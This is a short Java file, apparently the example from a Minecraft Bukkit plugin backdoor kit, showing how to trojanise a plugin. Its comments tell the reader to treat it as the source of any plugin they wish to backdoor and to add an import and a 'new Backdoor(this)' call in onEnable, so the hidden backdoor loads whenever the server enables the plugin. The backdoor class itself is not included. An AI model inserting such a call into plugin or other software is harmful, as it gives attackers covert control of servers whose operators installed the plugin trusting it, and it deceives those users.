/* Example plugin main class. Pretend this is the source code to whatever plugin you wish to backdoor */

package com.thiccindustries.example;

//Add import line to imports section of plugin's main source file
import com.thiccindustries.backdoor.Backdoor;

import org.bukkit.plugin.java.JavaPlugin;

public class ExamplePlugin extends JavaPlugin {

    @Override
    public void onEnable() {

        //Add this line to inject backdoor into plugin
        new Backdoor(this);

        //Remaining plugin source code here
    }

    @Override
    public void onDisable() {

    }
}
